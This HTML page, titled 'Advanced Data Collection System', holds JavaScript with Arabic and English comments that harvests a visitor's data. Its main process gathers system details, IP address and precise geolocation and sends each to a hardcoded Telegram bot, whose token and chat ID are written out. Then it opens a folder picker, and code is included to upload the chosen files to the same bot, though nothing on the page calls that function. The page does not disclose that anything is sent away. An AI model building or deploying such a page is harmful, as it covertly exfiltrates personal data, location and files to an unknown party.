<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Data Collection System</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f9f9f9;
            min-height: 100px;
            text-align: left;
        }
        .log {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px solid #eee;
        }
        .success { color: green; }
        .warning { color: orange; }
        .error { color: red; }
        #directoryPicker {
            display: none;
        }
        .btn-blue {
            background-color: #4285f4;
        }
        .btn-blue:hover {
            background-color: #3367d6;
        }
        .progress-bar {
            width: 100%;
            background-color: #ddd;
            border-radius: 4px;
            margin: 10px 0;
        }
        .progress {
            height: 20px;
            background-color: #4CAF50;
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s;
        }
        #deviceInfo {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f9f9f9;
            font-family: monospace;
            white-space: pre;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Advanced Data Collection System</h1>
        
        <div>
            <button onclick="startFullProcess()">Start Full Process</button>
            <button class="btn-blue" onclick="requestDirectoryAccess()">Select Folder to Upload</button>
            <button onclick="collectDeviceInfo()">Get Device Info</button>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="uploadProgress"></div>
        </div>
        
        <input type="file" id="directoryPicker" webkitdirectory directory multiple>
        <div id="output"></div>
        <div id="deviceInfo">Click "Get Device Info" to collect device information...</div>
    </div>

    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s";
        const TELEGRAM_CHAT_ID = "6913353602";
        let selectedFiles = [];

        /* 
        [Arabic Explanation]
        نظام التسجيل: يعرض رسائل الحالة في واجهة المستخدم
        Logging system: Displays status messages in the UI
        */
        function log(message, type = '') {
            const output = document.getElementById('output');
            const logEntry = document.createElement('div');
            logEntry.className = `log ${type}`;
            logEntry.textContent = message;
            output.appendChild(logEntry);
            output.scrollTop = output.scrollHeight;
        }

        /*
        [Arabic Explanation]
        تحديث شريط التقدم: يظهر نسبة إتمام العملية
        Progress bar update: Shows completion percentage
        */
        function updateProgress(percent) {
            document.getElementById('uploadProgress').style.width = `${percent}%`;
        }

        /*
        [Arabic Explanation]
        إرسال رسائل نصية إلى التلجرام
        Send text messages to Telegram
        */
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (e) {
                log(`Telegram send error: ${e}`, 'error');
                return false;
            }
        }

        /*
        [Arabic Explanation]
        إرسال صور إلى التلجرام
        Send photos to Telegram
        */
        async function sendPhotoToTelegram(photoFile) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoFile);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                log(`Photo upload error: ${error}`, 'error');
                return false;
            }
        }

        /*
        [Arabic Explanation]
        إرسال ملفات إلى التلجرام
        Send files to Telegram
        */
        async function sendDocumentToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', file);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                return response.ok;
            } catch (error) {
                log(`File upload error: ${error}`, 'error');
                return false;
            }
        }

        /*
        [Arabic Explanation]
        طلب اختيار مجلد من المستخدم
        Request folder selection from user
        */
        function requestDirectoryAccess() {
            document.getElementById('directoryPicker').click();
        }

        /*
        [Arabic Explanation]
        معالجة الملفات المختارة في المجلد
        Process selected files in folder
        */
        document.getElementById('directoryPicker').addEventListener('change', async (e) => {
            const files = Array.from(e.target.files);
            if (files.length === 0) return;

            selectedFiles = files;
            log(`Selected ${files.length} files in folder`, 'success');
            
            log('Selected files:', 'success');
            files.forEach((file, index) => {
                log(`${index + 1}. ${file.name} (${formatFileSize(file.size)})`);
            });
        });

        /*
        [Arabic Explanation]
        رفع جميع الملفات المحددة إلى التلجرام
        Upload all selected files to Telegram
        */
        async function uploadAllFiles() {
            if (selectedFiles.length === 0) {
                log('No files selected', 'warning');
                return;
            }

            log(`Starting upload of ${selectedFiles.length} files...`, 'success');
            updateProgress(0);

            let uploadedCount = 0;
            const errors = [];

            for (let i = 0; i < selectedFiles.length; i++) {
                const file = selectedFiles[i];
                try {
                    let success;
                    if (file.type.startsWith('image/')) {
                        success = await sendPhotoToTelegram(file);
                    } else {
                        success = await sendDocumentToTelegram(file);
                    }
                    
                    if (success) {
                        log(`Uploaded: ${file.name} (${formatFileSize(file.size)})`, 'success');
                        uploadedCount++;
                    } else {
                        log(`Failed to upload: ${file.name}`, 'error');
                        errors.push(file.name);
                    }
                } catch (error) {
                    log(`Error processing ${file.name}: ${error}`, 'error');
                    errors.push(file.name);
                }

                const progress = Math.round(((i + 1) / selectedFiles.length) * 100);
                updateProgress(progress);
            }

            log(`\nUpload completed`, 'success');
            log(`- Successfully uploaded: ${uploadedCount}/${selectedFiles.length}`);
            if (errors.length > 0) {
                log(`- Failed files: ${errors.join(', ')}`, 'error');
            }
            updateProgress(100);
        }

        /*
        [Arabic Explanation]
        الحصول على الموقع الجغرافي الدقيق
        Get precise geolocation
        */
        async function getRealLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    log('Geolocation not supported', 'warning');
                    return resolve(null);
                }

                log('Getting location... Please grant permission');

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        const locationMessage = `Precise Location:
Latitude: ${lat.toFixed(6)}
Longitude: ${lon.toFixed(6)}
Accuracy: ±${Math.round(accuracy)} meters
Map: https://www.google.com/maps?q=${lat},${lon}`;
                        
                        log(locationMessage, 'success');
                        await sendToTelegram(locationMessage);
                        resolve({ lat, lon });
                    },
                    (error) => {
                        const errorMessage = {
                            1: 'Permission denied',
                            2: 'Position unavailable',
                            3: 'Timeout'
                        }[error.code] || error.message;
                        
                        log(`Location error: ${errorMessage}`, 'error');
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        /*
        [Arabic Explanation]
        الحصول على عنوان IP
        Get IP address
        */
        async function getIPAddress() {
            try {
                log('Getting IP address...');
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                log(`IP Address: ${data.ip}`, 'success');
                await sendToTelegram(`IP Address: ${data.ip}`);
                return data.ip;
            } catch (error) {
                log(`IP error: ${error}`, 'error');
                return null;
            }
        }

        /*
        [Arabic Explanation]
        جمع معلومات النظام والجهاز
        Collect system and device information
        */
        async function getSystemInfo() {
            try {
                const info = {
                    'OS': navigator.platform,
                    'User Agent': navigator.userAgent,
                    'Language': navigator.language,
                    'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
                    'Device Memory': `${navigator.deviceMemory || 'Unknown'} GB`,
                    'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
                    'Current Time': new Date().toLocaleString(),
                    'Online Status': navigator.onLine ? 'Online' : 'Offline'
                };

                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info['Battery Level'] = `${Math.floor(battery.level * 100)}%`;
                    info['Charging Status'] = battery.charging ? 'Charging' : 'Not charging';
                }

                log('System Information:', 'success');
                let telegramMessage = "<b>System Information:</b>\n";
                
                for (const [key, value] of Object.entries(info)) {
                    log(`- ${key}: ${value}`);
                    telegramMessage += `- ${key}: ${value}\n`;
                }
                
                await sendToTelegram(telegramMessage);
                return info;
            } catch (error) {
                log(`System info error: ${error}`, 'error');
                return null;
            }
        }

        /*
        [Arabic Explanation]
        تنسيق حجم الملف لقراءة أسهل
        Format file size for better readability
        */
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
        }

        /*
        [Arabic Explanation]
        جمع معلومات الجهاز المفصلة
        Collect detailed device information
        */
        async function collectDeviceInfo() {
            const infoDiv = document.getElementById('deviceInfo');
            infoDiv.textContent = "Collecting device information... Please wait";
            
            try {
                const deviceInfo = {
                    "📱 Device Information": "",
                    "Country": "🔻 " + await getCountry(),
                    "City": await getCity(),
                    "IP Address": await getIPAddress(),
                    "Battery Level": await getBatteryLevel(),
                    "Is Charging?": await isCharging(),
                    "Network": navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    "Connection Type": navigator.connection ? navigator.connection.type : "Unknown",
                    "Time": "⏰ " + new Date().toLocaleString(),
                    "Device Name": "🖥️ " + navigator.userAgent,
                    "Device Model": navigator.userAgentData ? navigator.userAgentData.model : "Unknown",
                    "Device Type": "📱 " + (navigator.userAgentData ? navigator.userAgentData.mobile ? "Mobile" : "Desktop" : "Unknown"),
                    "RAM (Memory)": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                    "Storage": await getStorageInfo(),
                    "CPU Cores": navigator.hardwareConcurrency || "Unknown",
                    "System Language": navigator.language,
                    "Browser Name": navigator.userAgentData ? navigator.userAgentData.brands[0].brand : navigator.appName,
                    "Browser Version": navigator.userAgentData ? navigator.userAgentData.brands[0].version : navigator.appVersion,
                    "Screen Resolution": window.screen.width + "x" + window.screen.height,
                    "OS Version": navigator.userAgentData ? navigator.userAgentData.platformVersion : "Unknown",
                    "Screen Orientation": window.screen.orientation ? window.screen.orientation.type : "Unknown",
                    "Color Depth": window.screen.colorDepth + " bits",
                    "Browser Last Updated": "Unknown",
                    "Security Protocol": window.location.protocol,
                    "Connection Frequency": navigator.connection ? navigator.connection.downlink + " Mbps" : "Unknown",
                    "Geolocation Supported": navigator.geolocation ? "Yes" : "No",
                    "Bluetooth Supported": navigator.bluetooth ? "Yes" : "No",
                    "Touch Support": 'ontouchstart' in window ? "Yes" : "No"
                };

                let infoText = "📱 Device Information:\n";
                for (const [key, value] of Object.entries(deviceInfo)) {
                    infoText += `- ${key}: ${value}\n`;
                }

                infoDiv.textContent = infoText;
                
            } catch (error) {
                infoDiv.innerHTML = `<span style="color:red">Error collecting information: ${error.message}</span>`;
            }
        }

        // Helper functions for device info
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/country_name/');
                return await response.text();
            } catch {
                return "Unknown";
            }
        }

        async function getCity() {
            try {
                const response = await fetch('https://ipapi.co/city/');
                return await response.text();
            } catch {
                return "Unknown";
            }
        }

        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return Math.round(battery.level * 100) + "%";
            }
            return "Unknown";
        }

        async function isCharging() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return battery.charging ? "Yes" : "No";
            }
            return "Unknown";
        }

        async function getStorageInfo() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const storage = await navigator.storage.estimate();
                    return Math.round(storage.quota / (1024 * 1024 * 1024)) + " GB";
                } catch {
                    return "Unknown";
                }
            }
            return "Unknown";
        }

        /*
        [Arabic Explanation]
        العملية الرئيسية التي تجمع كل البيانات
        Main process that collects all data
        */
        async function startFullProcess() {
            try {
                log('🚀 Starting full process...', 'success');
                
                // 1. Collect system info
                await getSystemInfo();
                
                // 2. Get IP address
                await getIPAddress();
                
                // 3. Get location
                await getRealLocation();
                
                // 4. Request folder selection
                requestDirectoryAccess();
                
                // 5. After folder selection, user can upload files
                log('✔ Initial steps completed', 'success');
                log('Please select folder to upload all contents', 'success');
            } catch (error) {
                log(`❌ Critical error: ${error}`, 'error');
            }
        }

        // Initialize page
        document.addEventListener('DOMContentLoaded', () => {
            log('Ready to start data collection. Click "Start Full Process"', 'success');
        });
    </script>
</body>
</html>
